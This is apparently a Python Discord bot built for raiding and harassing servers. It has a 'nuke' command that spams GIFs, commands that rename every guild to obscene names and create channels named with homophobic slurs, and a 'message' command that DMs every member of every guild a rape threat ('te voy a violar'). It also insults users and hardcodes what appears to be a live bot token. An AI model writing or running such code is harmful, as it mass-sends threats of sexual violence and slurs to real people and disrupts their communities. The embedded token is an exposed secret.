import random
import gtts
import asyncio
from mutagen.mp3 import MP3
import discord
from discord.ext import commands
from discord import FFmpegPCMAudio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

gifs = ["https://tenor.com/view/shitpost-meme-yellow-emoji-funny-meme-fuck-i-just-forgor-gif-24710392","https://tenor.com/view/baby-crib-fall-gif-7909339",""]
random_gifs = []

bot = commands.Bot(command_prefix = '!', intents=intents)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

def pick_random():
    random_gifs = []
    random.shuffle(gifs)
    length = 0
    for gif in gifs:
        if length + len(gif) <= 2000:
            random_gifs.append(gif)
            length = length + len(gif)
    return (" ").join(random_gifs)
        

## TURN ON NUKE
stop_nuke = False
nuke_on = False

@bot.command()
async def nuke(ctx,arg=None):
    global stop_nuke,nuke_on
    nuke_on = True
    for i in range(20):
        if stop_nuke != True:
            gifs = pick_random()
            await ctx.send(gifs)
            await asyncio.sleep(0.1)
    stop_nuke = False
    nuke_on = False
    
## STOP NUKE
@bot.command()
async def stop(ctx):
    global stop_nuke,nuke_on
    if nuke_on:
        stop_nuke = True
        print("apagando")

## RECOPILA LOS NOMBRES DE LOS USUARIOS DEL CANAL Y LOS DICE
@bot.command()
async def miedoextremo(ctx):
    members = []
    for member in ctx.message.author.voice.channel.members:
        if member != "Mr. Fredo#4242":
            members.append(member.name)
            print(member)
    mensaje = str(", ".join(members))+". gracias por usar nuestros servicios. Esperamos que lo disfruten. Recordamos que no nos hacemos responsable del uso y los desperfectos que nuestra tecnología pueda ocasionar. Atentamente Pro Bots Corporation. Gracias"
    gtts.gTTS(mensaje, lang="es", tld="com.mx").save("hola.mp3")
    duration = MP3("hola.mp3").info.length
    if (ctx.author.voice):
        channel = ctx.message.author.voice.channel
        voice = await channel.connect()
        source = FFmpegPCMAudio('hola.mp3')
        player = voice.play(source)
        await asyncio.sleep(duration)
        #source = FFmpegPCMAudio('Kazakhstan bomb meme.mp3')
        #player = voice.play(source)
        #await asyncio.sleep(MP3('Kazakhstan bomb meme.mp3').info.length)
        await ctx.voice_client.disconnect()
    else:
        await ctx.send("no estas en un canal puta cerda")


## ENRTA AL SERVER Y PONE AUDIO MORO
@bot.command(pass_context = True)
async def join(ctx):
    if (ctx.author.voice):
        channel = ctx.message.author.voice.channel
        voice = await channel.connect()
        source = FFmpegPCMAudio('Kazakhstan bomb meme.mp3')
        player = voice.play(source)
    else:
        await ctx.send("no estas en un canal puta cerda")


## MANDA MD
@bot.command()
async def message(ctx):
    miembros = []
    for guild in bot.guilds:
        for member in guild.members:
            if member != "Mr. Fredo#4242":
                miembros.append(member)
    message = "hola, te voy a violar"
    embed = discord.Embed(title=message)
    for miembro in miembros:
        await miembro.send(embed=embed)

## LIMPIAR SERVER
@bot.command()
async def clean(ctx):
    for guild in bot.guilds:
        await guild.edit(name="test land")
        for channel in guild.channels:
            if channel.name == "puto-gay":
                await channel.delete()
        for category in guild.categories:
            if category.name == "german es gay":
                await category.delete()

## PETAR CANALES
@bot.command()
async def canales(ctx):
    for guild in bot.guilds:
        await guild.edit(name="pene")
        categoriagerman = await guild.create_category("german es gay")
        for i in range(2):
            await guild.create_text_channel("puto gay", category=categoriagerman.category_id)

bot.run('MTAxMTYwNDM0NzY0NzQzMDc1Ng.GHzZ02.Iq6G9mh0rPZmYX8J7rKA9YPkTqZRYEghZ6MXHo')